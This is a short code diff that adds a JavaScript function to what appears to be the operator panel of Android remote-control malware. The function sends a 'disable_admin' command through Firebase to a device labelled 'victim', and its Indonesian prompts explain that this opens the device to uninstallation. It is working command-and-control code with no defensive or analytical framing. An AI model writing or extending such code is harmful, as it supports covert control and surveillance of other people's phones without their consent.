@@ -349,6 +349,25 @@
                 document.head.appendChild(script);
             });
         }
+
+        function disableDeviceAdmin(userUid, victimId) {
+    if (!confirm('Yakin mau matiin Device Admin? Ini bakal buka akses uninstall!')) {
+        return;
+    }
+    
+    const db = firebase.database();
+    const cmdRef = db.ref(`commands/${userUid}/${victimId}`).push();
+    
+    cmdRef.set({
+        cmd: "disable_admin",
+        params: {},
+        timestamp: firebase.database.ServerValue.TIMESTAMP,
+        executed: false,
+        from_panel: true
+    }).then(() => {
+        alert('Command sent! Device admin akan dimatiin dalam beberapa detik');
+    });
+}
         
         function loadScript(src) {
             return new Promise((resolve, reject) => {
